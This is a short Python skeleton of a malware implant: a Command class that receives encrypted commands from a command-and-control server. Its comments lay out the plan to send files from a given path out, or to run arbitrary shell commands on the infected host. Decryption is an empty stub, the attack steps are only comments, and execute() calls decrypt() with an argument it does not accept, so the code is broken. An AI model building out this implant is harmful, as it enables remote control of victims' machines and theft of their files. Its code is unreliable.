class Command:
    """ A class for handling the command sent by the C&C server. """

    def __init__(self, encrypted_command):
        self.cmd = encrypted_command
    
    def decrypt(self):
        """ Decrypts the encrypted command into either a shell command or file retrieval command. """
        pass
    
    def execute(self):
        """ Executes the command based on the type of command. """
        decrypted = self.decrypt(self.cmd)
        
        # if decrypted starts with "get:"
            # send data from <path>
        # else
            # execute command in shell environment